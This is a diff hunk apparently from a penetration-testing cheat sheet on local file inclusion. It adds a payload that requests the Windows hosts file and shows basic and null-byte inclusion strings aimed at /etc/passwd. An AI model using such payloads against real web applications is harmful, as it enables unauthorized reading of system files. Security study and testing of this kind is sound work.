@@ -707,7 +707,8 @@ Windows file accessible to all users
 	c:\windows\system32\drivers\etc\hosts	
 Linux file accessible to all users
 	/etc/passwd
-
+	
+?file=\\Windows\\System32\\drivers\\etc\\hosts
 
 Basic file inclusion: xxx.php?language=/etc/passwd             (../) or simply (/)
 Null byte inclusion: xxx.php?language=/etc/passwd%00           (%00) or (%00jpg)
